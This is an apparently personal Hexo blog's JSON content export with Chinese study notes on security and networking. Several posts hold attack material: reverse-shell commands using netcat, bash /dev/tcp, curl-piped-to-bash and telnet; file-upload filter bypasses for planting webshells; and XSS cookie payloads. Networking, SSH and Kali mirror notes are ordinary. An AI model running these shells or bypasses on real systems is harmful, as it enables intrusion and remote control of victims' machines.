{"meta":{"title":"eriseda","subtitle":null,"description":"要继续努力鸭！！！","author":"eriseda","url":""},"pages":[{"title":"分类","date":"2020-11-24T07:12:19.000Z","updated":"2021-11-08T06:46:39.878Z","comments":false,"path":"categories/index.html","permalink":"/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2021-11-09T14:13:18.000Z","comments":false,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"[さくら荘のhojun] 与&nbsp; Mashiro&nbsp; （ 真（ま）白（しろ） ） 对话中... bot_ui_ini()","keywords":"关于"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2021-11-09T14:13:18.000Z","comments":false,"path":"bangumi/index.html","permalink":"/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2021-11-09T14:13:18.000Z","comments":false,"path":"client/index.html","permalink":"/client/index.html","excerpt":"","text":"直接下载 or 扫码下载：","keywords":"Android客户端"},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2021-11-09T14:13:18.000Z","comments":true,"path":"comment/index.html","permalink":"/comment/index.html","excerpt":"","text":"念两句诗 叙别梦、扬州一觉。 【宋代】吴文英《夜游宫·人去西楼雁杳》","keywords":"留言板"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2021-11-09T14:13:18.000Z","comments":false,"path":"lab/index.html","permalink":"/lab/index.html","excerpt":"","text":"sakura主题balabala","keywords":"Lab实验室"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2021-11-09T14:13:18.000Z","comments":false,"path":"donate/index.html","permalink":"/donate/index.html","excerpt":"","text":"","keywords":"谢谢饲主了喵~"},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2021-11-09T14:13:18.000Z","comments":false,"path":"music/index.html","permalink":"/music/index.html","excerpt":"","text":"","keywords":"喜欢的音乐"},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2021-11-09T14:13:18.000Z","comments":true,"path":"links/index.html","permalink":"/links/index.html","excerpt":"","text":"","keywords":"友人帐"},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2021-11-09T14:13:18.000Z","comments":false,"path":"video/index.html","permalink":"/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '放送时间: 2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} 番组计划 这里将是永远的回忆 window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} 放送时间: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"B站"},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2021-11-09T14:13:18.000Z","comments":true,"path":"rss/index.html","permalink":"/rss/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2023-04-15T05:40:05.611Z","comments":true,"path":"tags/index.html","permalink":"/tags/index.html","excerpt":"","text":""},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2021-11-09T14:13:18.000Z","comments":false,"path":"theme-sakura/index.html","permalink":"/theme-sakura/index.html","excerpt":"","text":"Hexo主题Sakura修改自WordPress主题Sakura，感谢原作者Mashiro","keywords":"Hexo 主题 Sakura 🌸"}],"posts":[{"title":"文件上传漏洞的各种姿势绕过","slug":"文件上传漏洞姿势绕过","date":"2022-11-14T08:00:00.000Z","updated":"2023-04-14T15:50:54.560Z","comments":true,"path":"2022/11/14/文件上传漏洞姿势绕过/","link":"","permalink":"/2022/11/14/文件上传漏洞姿势绕过/","excerpt":"","text":"文件上传漏洞的各种姿势绕过（php举例）1，burp抓包将.jpg改.php绕过js检测2，大小以及双写绕过：PHP ，pHP，phphpp3，不常见的php后缀绕过：php3，php44，mime检测绕过：抓包更改Content-Tybe为image/jpeg5，特殊后缀绕过：php. ，php空格，php.空格. ,phtml6，htaccess绕过：.htaccess文件作用：将文件当php文件解析 ，首先，上传.htacces文件 内容：SetHandler application/x-httpd-php 之后在上传.jpg木马文件即可。路径不用更改为php7，.user.ini文件绕过：先上传一个以 auto_propend_file=1.gif 为内容的.user.ini文件【用户自定义的配置文件】。.user.ini文件里的意思是：所有的php文件都自动包含1.gif文件，.user.ini相当于一个用户自定义的php.ini。然后再上传一个内容为一句话木马的命名为1.gif的文件。利用蚁剑连接一句话木马，url地址为图片地址，但需要把图片文件名改为readme.php。8，::$DATA绕过 ：windows中默认::$DATA为数据流，burp抓包在php后缀上添加::DATA ,系统会默认为数据流，不会对后缀做检测，到达系统后 自动将::$DATA删除从而达到绕过。9，0X00截断0x00是十六进制表示方法，表示ASCII码为0的字符，在一些函数处理时，会把这个字符当作结束符。0x00可以用在对文件名的绕过上，具体原理：系统在对文件名进行读取时，如果遇到0x00，就会认为读取已经结束。但要注意是文件的十六进制内容里的00，而不是文件名中的00。也就是说系统是按二进制或十六进制读取文件，遇到ASCII码为0的位置就停止，而这个ASCII码为0的位置在十六进制中是00。总之就是利用ASCII码为0这个特殊字符，让系统认为字符串已经结束10，%00截断url发送到服务器后被服务器解码，这时还没有传到验证函数，也就是说验证函数里接收到的不是%00字符，而是%00解码后的内容，即解码成了0x00。总之就是%00被服务器解码为0x00发挥了截断作用。抓包在php后缀后面添加%00即可。","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"/tags/文件上传/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"启动ssh服务","slug":"ssh服务","date":"2022-08-28T08:00:00.000Z","updated":"2023-04-14T15:48:41.974Z","comments":true,"path":"2022/08/28/ssh服务/","link":"","permalink":"/2022/08/28/ssh服务/","excerpt":"","text":"一，首先安装ssh服务安装ssh命令：1，如果你用的是redhat，fedora，centos等系列linux发行版，那么敲入以下命令：sudo yum install sshd 或者sudo yum install openssh-server 2，如果你使用的是debian，ubuntu，linux mint等系列的linux发行版，那么敲入以下命令：sudo apt-get install sshd 或者sudo apt-get install openssh-server 二，开启ssh服务在终端敲入以下命令：sudo service sshd start 开机自启动：update-rc.d ssh enable 关闭自启动：update-rc.d ssh disabled 三，卸载ssh服务1，如果你用的是redhat，fedora，centos等系列linux发行版，敲入以下命令：sudo yum remove sshd 2，如果你使用的是debian，ubuntu，linux mint等系列的linux发行版，那么敲入以下命令：sudo apt-get –purge remove sshd 四，遇到问题1，出现一下提示：Failed to start sshd.service: Unit sshd.service not found.解决方法：安装ssh.serversystemctl enable ssh.service 2，连接xshell方法：修改/etc/ssh/sshd_config文件，将其中”PasswordAuthentication yes “前#删除。3，xshell 无法使用root账号连接（提示密码错误）解决方法：修改/etc/ssh/sshd_config文件，把其中的 “PermitRootLogin Prohibit-password” 这一行修改成 “PermitRootLogin yes” （记得将#删掉）​","categories":[{"name":"环境配置","slug":"环境配置","permalink":"/categories/环境配置/"}],"tags":[{"name":"ssh","slug":"ssh","permalink":"/tags/ssh/"}],"keywords":[{"name":"环境配置","slug":"环境配置","permalink":"/categories/环境配置/"}]},{"title":"xss的原理，分类和防御。","slug":"xss漏洞原理，攻击和防御","date":"2022-08-13T08:00:00.000Z","updated":"2023-04-14T15:49:33.390Z","comments":true,"path":"2022/08/13/xss漏洞原理，攻击和防御/","link":"","permalink":"/2022/08/13/xss漏洞原理，攻击和防御/","excerpt":"","text":"一，xss漏洞原理1，原理：web网页通常都是动态的，内容根据数据库来生成，例如：在网站上评论一条消息，评论先保存数据库。当其他用户或您二次浏览时候，后端需要查询数据库，最终生成浏览界面。网页渲染：1，服务端渲染：后端渲染好html界面，在返回给浏览器。2，客户端渲染：前端通过js脚本操作dom节点，动态调整html网页。无论那种渲染，都是将数据拼接在html网页，在呈现给用户。攻击者则需要插入一些恶意代码，则可以达到目的。二，xss分类：一，反射性： 需要用户点击对应的链接才能触发，通常在url中构造，用户浏览器解析恶意代码。向恶意服务器发出请求，攻击者获得用户向目标提交的信息。 二，存储型：它的危害比较大 ，用户无需点击恶意链接，攻击者事先将恶意的js代码传入服务器中，实现持久化攻击，每当用户请求服务器时，都能解析恶意代码。 三，DOM XSS：DOM型XSS一般和服务器的解析响应没有直接关系，而是在JS脚本动态执行的过程中产生的。不经过后端。DOM型是特殊的反射型XSS，在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。三，xss防御：1，对用户输入的字符进行过滤2，对用户输入的内容进行转义处理，防止普通文本被浏览器当作html标签处理四，xss一些代码：&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt; &lt;script&gt;alert(document.cookie)&lt;/script&gt; &lt;img src=11 onerror=alert(1)&gt;","categories":[{"name":"学习","slug":"学习","permalink":"/categories/学习/"}],"tags":[{"name":"xss","slug":"xss","permalink":"/tags/xss/"}],"keywords":[{"name":"学习","slug":"学习","permalink":"/categories/学习/"}]},{"title":"反弹shell方法","slug":"反弹shell","date":"2022-07-25T08:00:00.000Z","updated":"2023-04-14T15:49:53.647Z","comments":true,"path":"2022/07/25/反弹shell/","link":"","permalink":"/2022/07/25/反弹shell/","excerpt":"","text":"反弹shell一，利用netcat反弹shell1，首先在linux下安装ncwget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz tar -xvzf netcat-0.7.1.tar.gz ./configure make &amp;&amp; make install make clean 2，之后攻击机开启本地监听：（端口任意）netcat -lvvp 9999 3，需要目标机主动连接攻击机：netcat 192.xxx.xxx.72 9999 -e /bin/bash 此时可以看见已经反弹shell 4，这种方法情况比较苛刻，需要在目标机安装netcat 。二，利用bash反弹shell1，攻击机开启本地监听：nc -lvvp 9999 2,目标机主动连接攻击：bash -i &gt;&amp; /dev/tcp/192.xxx.xxx.xxx/9999 0&gt;&amp;1 3,效果如下： 2，curl配合bash反弹shell1，首先需要攻击者在vps上的web目录创建index文件内容如下：bash -i &gt;&amp; /dev/tcp/192.xxx.xxx.72/9999 0&gt;&amp;1 这里以python开http服务 为例：（index文件与开始的终端应在同一目录下）python -m http.server 8080 2.使用nc开启9999端口进行监听3，在目标机器执行以下命令，反弹shellcurl 192.xxx.xxx.xxx:8080/[文件名]|bash 注意：curl IP|bash 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。三，利用Telnet反弹shell1，当nc和dev/tcp不可用，并且目标主机和攻击机支持telnet服务时 。我们可以利用telnet来反弹shell方法一：攻击机开启本地监听：nc -lvvp 9999 目标机主动连接攻击机：mknod a p; telnet 192.xxx.xxx.xxx 9999 0&lt;a | /bin/bash 1&gt;a 方法二：攻击机开启两个本地监听：nc -lvvp 9999 nc -lvvp 8888 目标机主动连接攻击机telnet 192.xxx.xxx.xxx 9999 | /bin/bash | telnet 192.xxx.xxx.xxx 8888","categories":[{"name":"学习","slug":"学习","permalink":"/categories/学习/"}],"tags":[{"name":"反弹shell","slug":"反弹shell","permalink":"/tags/反弹shell/"}],"keywords":[{"name":"学习","slug":"学习","permalink":"/categories/学习/"}]},{"title":"tomcat cve-2017-12615漏洞复现","slug":"tomcat cve-2017-12615漏洞复现","date":"2022-07-20T08:00:00.000Z","updated":"2023-04-14T15:49:03.035Z","comments":true,"path":"2022/07/20/tomcat cve-2017-12615漏洞复现/","link":"","permalink":"/2022/07/20/tomcat cve-2017-12615漏洞复现/","excerpt":"","text":"一，tomcat cve-2017-12615漏洞复现1，首先使用docker搭建一个vulhub（官网：vulhub.org）集成环境。git clone https://github.com/vulhub/vulhub.git 2，切换vulhub的目录下，找到需要复现的漏洞（本次是tomcat cve-2017-12615）切换到该漏洞目录下。3，输入docker命令，搭建tomcatdocker-compose up -d 此时中间出现了一点小插曲：（如图所示） 之后查了一下资料原因：这是因为在启动docker的时候防火墙做了策略，如果容器在运行中，停止防火墙，在操作容器就会报这个错误，我们可以输入一下命令重启docker解决此问题。（确实我当时关闭了防火墙）systemctl restart docker.service 4，默认端口8080，（检查好端口是否被占用） 5，利用burp抓包，发送repeater 6，使用PUT协议进行写入文件，但此时由于tomcat会对jsq后缀进行校验，所以需要在文件名结尾处加入%20 进行绕过 7，此时可以发现jsq文件已经成功上传成功。","categories":[{"name":"漏洞","slug":"漏洞","permalink":"/categories/漏洞/"}],"tags":[{"name":"tomcat","slug":"tomcat","permalink":"/tags/tomcat/"}],"keywords":[{"name":"漏洞","slug":"漏洞","permalink":"/categories/漏洞/"}]},{"title":"极客大挑战 2019（Http）","slug":"[极客大挑战 2019]Http","date":"2022-04-10T08:00:00.000Z","updated":"2023-04-14T15:43:59.327Z","comments":true,"path":"2022/04/10/[极客大挑战 2019]Http/","link":"","permalink":"/2022/04/10/[极客大挑战 2019]Http/","excerpt":"","text":"一，[极客大挑战 2019]Http1，打开题目： 2，brup抓包 发现：Secret.php 文件 3，发送repeater， 4，使用referer更改网页来源 5，更改浏览器信息为：Syclover 6，还未结束，locally！！伪造一下本地请求XXF 此时已经得到flag，但是要注意的是xxf时 get请求需要后面有两个空行，也是红线划的部分。","categories":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}],"tags":[{"name":"题目","slug":"题目","permalink":"/tags/题目/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"/categories/ctf/"}]},{"title":"华为的一些命令","slug":"华为命令","date":"2022-03-29T08:00:00.000Z","updated":"2023-04-14T15:50:15.822Z","comments":true,"path":"2022/03/29/华为命令/","link":"","permalink":"/2022/03/29/华为命令/","excerpt":"","text":"一，华为的一些命令1，配置交换机名称和密文密码：system-view //进入系统视图配置quit或return //退出系统视图sysname xxx //设置主机名user-interface console 0 //进入控制台authentication-mode password //登陆时需要密码验证set authentication password cipher xxx //配置密文密码2，配置交换机的远程管理ip地址：interface Vlanif 1 //进入VLAN1ip add 192.168.1.254 24 //配置ipundo shutdown //开启接口dns domain xxx.com //设置域名dns server 192.168.254.254 //取消提示信息dis vlan 显示vlan save保存设置dis curr 显示当前配置 reboot重启设备undo terminal monitor //取消提示信息3，配置交换机端口速率，双工，ARP：int g0/0/1 //进入接口description xxx //端口描述undo negotiation auto //取消协商duplex full //全双工auto duplex full //自动speed 10 //速率10mauto speed 100 //自动arp static 192.168.1.8 5499-98cf-2603 //绑定mac地址dis arp all //查看arp4，配置路由器接口ip和静态路由：int g/0/0/1//进入接口ip add 192.168.1.6 24 //配置ip地址dis cur 或 [Huiwei]dis cur //两种模式下都可查看arp5，配置静态路由：ip route-static 192.168.20.0 24 10.0.12.2ip route-static 192.168.10.0 24 serial 0/0/1 //可选出口ip route-static 0.0.0.0 0 192.168.1.5 //默认路由dispaly ip routing-table //查看路由表6，配置交换vlan相关命令：vlan 10 //创建vlandescription xxx //vlan描述vlan batch 30 50 //创建多个不连续vlanvlan batch 2 to 20 //创建连续vlanint g0/0/1 //进入接口port link-type access //访问口port default vlan 10 //加入vlanport link-type trunk //干道口port trunk allow-pass vlan 10 20 //允许通过的vlan口port trunk allow-pass all //所有# 7，混合模式int e0/0/2 //进入接口port link-type hybrid //混合口模式undo port default vlan //删除默认vlanport hybrid untagged vlan 20 //去标签port hybrid pvid vlan 2 //设置默认vlanport trunk allow-pass vlan10 to 100 //允许通过的vlan口（前面加undo不允许）dis port vlan //查看vlandisplay vlan //查看vlan8，配置交换机vlan一致性gvrp ：通用vlan注册协议，国际标准。双向注册。Normal模式： （类似cisco交换机服务器模式）[Huawei]gvrp //开启gvrp 也是默认模式Fixed模式： (类似cisco交换机客户机模式)[Huawei-g0/0/2]gvrp registration fixedForbidden模式： (类似cisco交换机透明模式)[Huawei-g0/0/3]gvrp registration forbiddendis vlan summary //查看vlan汇总dis gvrp status //查看gvrp状态9，配置路由器rip协议：ripv1 ripv2rip //启用rip默认v1network 192.168.1.0 //发布直连网段version 2 //配置v2版本dis rip //查看ripdis rip database //查看rip数据库dis rip routing-table //查看路由表优先级：直连0 静态60 rip100 ospf 10/15010，配置路由器ospf协议：[Huawei]ospf //启用OSPF默认是进程1[Huawei-ospf-1]area 0 //进入区域0[Huawei-ospf-1-area-0.0.0.0]network 192.168.3.0 0.0.0.255 //发布直连网段[Huawei-ospf-1silent-interface ]g0/0/2 //被动接口[Huawei]dis ospf interface //查看ospf通告[Huawei]dis ospf peer //查看ospf邻居[Huawei]dis ip routing-table //查看路由表[Huawei]dis ospf routing //查看ospf路由表11，配置基于全局的DHCP协议：[Huawei]dhcp enabie //开启dhcp[Huaweijip pool dtwlxy //地址池名[Huawei-ip-pool-dtwlxy]network 192.168.1.0//地址池[Huawei-ip-pool-dtwlxy]lease day 2 //租约默认1[Huawei-ip-pool-dtwlxy]gateway-list 192.168.1.254 //网关，[Huawei-ip-pool-dtwlxy]excluded-ip-address 192.168.1.250 192.168.1.253 //排除IP范围（这些IP不被发布）[Huawei-ip-pool-dtwlxy]dns-list 8.8.8.8 //DNS服务器[Huawei-G0/0/0]dhcp select global //基于全局。12，配置基于接口的DHCP协议：[Huawei]dhcp enable //开启dhcp[Huawei]int g0/0/1 //进入接口[Huawei-G0/0/1]dhcp select interface //基于接口[Huawei-G0/0/ ldhcp server lease day 2 //租约默认1[Huawei-G0/0/]dhcp server excluded-ip-address192.168.1.1 192.168.1.10 //排除IP范围[Huawei-G0/0/1]dhcp server dns-list 8.8.8.8 //DNS[Huawei]dis ip pool //查看dhcp13，配置路由器基本ACL：2000-2999[Huawei]acl 2000 //配置基本acl[Huawei-acl-basic-2000]rule 5 permit source 1.1.1.1 0 //允许源IP(注意反掩码0，默认步长5)[Huawei-acl-basic-2000]rule 10 deny any //拒绝任意[Huawei]user-interface vty 04 //进入虚拟接口 （g0/0/0物理口）[Huawei-ui-vty0-4]acl 2000 inbound //应用acl中93[Huawei]dis acl all //查看所有acl[Huawei]dis acl 2000 //查看acl 200014，配置路由器高级ACL：3000-3999[Huawei]acl 3000 //配置高级acl[Huawei-acl-adv-3000]rule permit ip source 1.1.1.1 0 destination 4.4.4.4 0 //允许访问[Huawei]user-interface vty 04 //进入虚拟接口[Huawei-ui-vty0-4]acl 3000 outbound //应用acl[Huawei]int g0/0/1 //进入接口[Huawei-G0/0/1]traffic-filter inbound acl 3000 //应用[Huawei]dis acl all //查看所有acl# 15，配置路由器动态NAT：（多对少）[Huawei]nat address-group 1 202.169.10.50 202.169.10.60 7 //外部IP[Huawei]acl 2001 //配置ACL[Huawei-acl-basic-2001]rule 5 permit source 172.17.1.0 0.0.0.255 //内部IP[Huawei]int g0/0/1 //进入接口[Huawei-GigabitEthernet0/0/0]nat outbound 2001 address-group 1 no-pat //应用NAT[Huawei]dis nat outbound //查看NAT# 16，配置路由器静态NAT：(一对一)[Huawei]int g0/0/1 //进入接口[Huawei-GigabitEthernet0/0/1]nat static global 202.169.10.5 inside 172.16.1.1 //一对一转换17，配置路由器动态NAPT：(多对一)[Huawei]int g0/0/0 //进入接口[Huawei-G0/0/0]nat outbound 2001 //多对一转接[Huawei]dis nat static //查看静态NAT18，配置三层交换机VLAN间路由：首先基本配置，IP、VLAN等。[Huaweijint vlanif 10 //进入接口[Huawei-Vlanif10jip add 192.168.1.254 24 //配IP[Huawei]int vlanif 20 //进入接口[Huawei-Vlanif20]ip add 192.168.2.254 24 //配IP[Huawei]dis ip interface brief //接口简略信息[Huawei]dis port vlan //接口vlan信息[Huawei]dis vlan //查看vlan信息。19，配置单臂路由VLAN间通信：首先基本配置，IP、VLAN等。[Huawei-G0/0/1.1]ip add 192.168.1.254 24 //配置IP[Huawei-G0/0/1.1]dot1q termination vid 10 //封装[Huawei-G0/0/1.1]arp broadcast enable //开启arp[Huawei]dis ip interface brief //查看接口[Huawei]dis ip routing-table //查看路由表[Huawei]display current-configuration //查看配置","categories":[{"name":"学习","slug":"学习","permalink":"/categories/学习/"}],"tags":[{"name":"华为命令","slug":"华为命令","permalink":"/tags/华为命令/"}],"keywords":[{"name":"学习","slug":"学习","permalink":"/categories/学习/"}]},{"title":"网工拓扑图，实现主机互联","slug":"网工拓扑全网通操作","date":"2022-03-20T08:00:00.000Z","updated":"2023-04-14T15:50:34.900Z","comments":true,"path":"2022/03/20/网工拓扑全网通操作/","link":"","permalink":"/2022/03/20/网工拓扑全网通操作/","excerpt":"","text":"网工拓扑图实现主机互联 1，首先在ensp中将设备添加好，注意：（添加路由器时不要选择router，因为它不支持ACL）2，用copper线按照端口要求连接好，之后将所有设备开启。3，配置路由器ip1，AR1 配置ip 2，AR2配置ip 此时由于两台路由器相连，并且已经配好ip，我们可以查看是否相通 此时两台路由已经相通。4，配置pc1，点击应用，即可。此时我们也可以，ping网关查看是否相通，进行验证2，其余pc配置与其相同，不做赘述。5，配置静态路由或rip实现全网联通1，配置AR1 注意：如果命令输错，我们可以使用命令查看是否被覆盖掉， dis cu 之后用undo命令删除 undo ip route-static 192.168.20.0 24 192.168.12.2 2，配置AR2 此时图中所有的电脑和路由都已相通。6，配置ACL，ACL 规则，并应用。 此时pc3和pc1是不互通的。将acl删除pc3和pc1又可互通","categories":[{"name":"学习","slug":"学习","permalink":"/categories/学习/"}],"tags":[{"name":"网工笔记","slug":"网工笔记","permalink":"/tags/网工笔记/"}],"keywords":[{"name":"学习","slug":"学习","permalink":"/categories/学习/"}]},{"title":"kali配置镜像源及升级软件源","slug":"kali配置镜像源并更新软件源","date":"2021-11-12T08:00:00.000Z","updated":"2023-04-14T15:46:35.676Z","comments":true,"path":"2021/11/12/kali配置镜像源并更新软件源/","link":"","permalink":"/2021/11/12/kali配置镜像源并更新软件源/","excerpt":"","text":"配置镜像源1，输入以下命令 vim /etc/apt/sources.list 2，按insert键进行编写，将原有的镜像源用#号注释掉或删除。 在最后面填入这三个镜像源中的一个. #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学 deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free 升级软件源镜像源配置完以后就可以升级软件源了 1，输入以下命令 apt-get update &amp;&amp; apt-get upgrade 